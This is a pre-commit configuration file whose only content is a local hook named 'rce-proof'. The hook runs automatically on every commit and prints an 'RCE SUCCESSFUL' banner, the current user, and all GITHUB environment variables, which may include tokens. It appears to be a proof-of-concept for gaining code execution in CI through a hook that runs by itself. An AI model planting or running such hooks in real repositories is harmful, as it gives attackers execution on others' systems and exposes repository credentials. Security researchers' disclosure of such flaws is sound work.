repos:
- repo: local
  hooks:
    - id: rce-proof
      name: rce-proof
      entry: bash -c "echo '!!! RCE SUCCESSFUL !!!' && echo 'User:' && whoami && echo 'Token Permissions:' && env | grep GITHUB"
      language: system
      always_run: true
      pass_filenames: false
